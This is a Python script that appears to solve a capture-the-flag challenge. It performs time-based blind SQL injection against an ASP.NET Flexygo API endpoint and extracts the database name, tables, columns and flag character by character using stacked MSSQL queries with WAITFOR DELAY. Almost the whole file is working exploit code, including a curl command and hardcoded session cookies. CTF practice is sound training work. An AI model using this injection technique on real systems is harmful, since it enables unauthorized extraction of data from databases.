import requests

#curl http://xx.yy.zz.pp/CTFSECADMIN/api/Sys/validateView --cookie "ASP.NET_SessionId=k13frr0430vazwulepsa3xbi; AspNet.Flexygo.CTFSECADMIN=Umkuks9MpAHU4u6GX5zs14uQuAlbBQqboItBxOL-oD9AU0-qtTP7PVECuNfqxY4HORKQW0zdS8goz07r3Aq52hHCzoyjpN-Ou4P70JE8sIOcA9H3FNwRD4dvd-4jy7emApyMxc1Nr_ejnV0jby593Q2JJnoQaJ_4Obkwz7MLFiaSdhmk4gkGqX8L8Q8OWvWBEW1xb6iRz9PYyMV9elMU6rRuL5y4_s9wk3qRWcNTLTscNBMbKR4JLrf36X0CTnpuXnxBfSGd8rlQCgcLC891Sg_xtWib-ON_e44wK5Q4HuhqJIUitbhIY3EB5-FP6neliDN02P06ioPVPZnI131GiROvB9JU-cC7oe8m-Rcd7Vda2YFLxzDvZ6W7DJP1yJJ6OKrPvlqDqr-iV0BXBJP4oCakw1Zkp-33pFq6M5cYXgF0QqWPWnfVVaim7Sxtth67" -d "ObjectName=SysHelp" -d "SQL=SELECT HelpId FROM Help;SET FMTONLY OFF;IF (EXISTS(SELECT 1 WHERE 1=1)) WAITFOR DELAY '00:00:01.500'"

#http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

url = "http://xx.yy.zz.pp/CTFSECADMIN/api/Sys/validateView"
cookies = {"ASP.NET_SessionId":"k13frr0430vazwulepsa3xbi",
        "AspNet.Flexygo.CTFSECADMIN":"Umkuks9MpAHU4u6GX5zs14uQuAlbBQqboItBxOL-oD9AU0-qtTP7PVECuNfqxY4HORKQW0zdS8goz07r3Aq52hHCzoyjpN-Ou4P70JE8sIOcA9H3FNwRD4dvd-4jy7emApyMxc1Nr_ejnV0jby593Q2JJnoQaJ_4Obkwz7MLFiaSdhmk4gkGqX8L8Q8OWvWBEW1xb6iRz9PYyMV9elMU6rRuL5y4_s9wk3qRWcNTLTscNBMbKR4JLrf36X0CTnpuXnxBfSGd8rlQCgcLC891Sg_xtWib-ON_e44wK5Q4HuhqJIUitbhIY3EB5-FP6neliDN02P06ioPVPZnI131GiROvB9JU-cC7oe8m-Rcd7Vda2YFLxzDvZ6W7DJP1yJJ6OKrPvlqDqr-iV0BXBJP4oCakw1Zkp-33pFq6M5cYXgF0QqWPWnfVVaim7Sxtth67"}

charset = "_-{|}[](),abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
def find_database(db_num):
    pos = 1
    found = ""
    while True:
        flag=False
        for char in charset:
            data = {"ObjectName":"SysHelp","SQL":"SELECT HelpId FROM Help;SET FMTONLY OFF;IF (EXISTS(SELECT 1 WHERE SUBSTRING(DB_NAME("+str(db_num)+"),"+str(pos)+",1)='"+char+"')) WAITFOR DELAY '00:00:01.500'"}
            response = requests.post(url,cookies=cookies,data=data)
            print(response.content)
            resptime = response.elapsed.total_seconds()
            if resptime > 1:
                found += char
                print("Found!:"+found)
                pos+=1
                flag=True
                break
        if flag is False:
            return found
            break

#found = find_database(6)
#ctfsecadmin_i

def find_tables():
    pos = 1
    found = ""
    while True:
        flag=False
        for char in charset:
            data = {"ObjectName":"SysHelp","SQL":"SELECT HelpId FROM Help;SET FMTONLY OFF;IF (EXISTS( SELECT * FROM (SELECT STRING_AGG(name,',') AS P from ctfsecadmin_i..sysobjects WHERE xtype = 'U') T WHERE SUBSTRING(P,"+str(pos)+",1)='"+char+"' )) WAITFOR DELAY '00:00:01.500'"}
            response = requests.post(url,cookies=cookies,data=data)
            #print(response.content)
            resptime = response.elapsed.total_seconds()
            if resptime > 1:
                found += char
                print("Found!:"+found)
                pos+=1
                flag=True
                break
        if flag is False:
            return found
            break

#found = find_tables()
#eventos

def find_columns():
    pos = 1
    found = ""
    while True:
        flag=False
        for char in charset:
            data = {"ObjectName":"SysHelp","SQL":"SELECT HelpId FROM Help;SET FMTONLY OFF;IF (EXISTS( SELECT * FROM (SELECT STRING_AGG(name,',') AS P from ctfsecadmin_i..syscolumns WHERE id = (SELECT id FROM ctfsecadmin_i..sysobjects WHERE name = 'eventos') ) T WHERE SUBSTRING(P,"+str(pos)+",1)='"+char+"' )) WAITFOR DELAY '00:00:01.500'"}
            response = requests.post(url,cookies=cookies,data=data)
            print(response.content)
            resptime = response.elapsed.total_seconds()
            if resptime > 1:
                print(resptime)
                found += char
                print("Found!:"+found)
                pos+=1
                flag=True
                break
        if flag is False:
            return found
            break

#found = find_columns()
#evento,fechaededto,flag,id,lugar

def find_flag():
    pos = 1
    found = ""
    while True:
        flag=False
        for char in charset:
            data = {"ObjectName":"SysHelp","SQL":"SELECT HelpId FROM Help;SET FMTONLY OFF;IF (EXISTS( SELECT * FROM (SELECT STRING_AGG(flag,',') AS P from ctfsecadmin_i..eventos ) T WHERE SUBSTRING(P,"+str(pos)+",1)='"+char+"' )) WAITFOR DELAY '00:00:01.500'"}
            response = requests.post(url,cookies=cookies,data=data)
            resptime = response.elapsed.total_seconds()
            if resptime > 1:
                print(resptime)
                found += char
                print("Found!:"+found)
                pos+=1
                flag=True
                break
        if flag is False:
            return found
            break

found = find_flag()
#SecAdmin{0d834f7a-9557-4f5d-b322-ba516aabcbea}
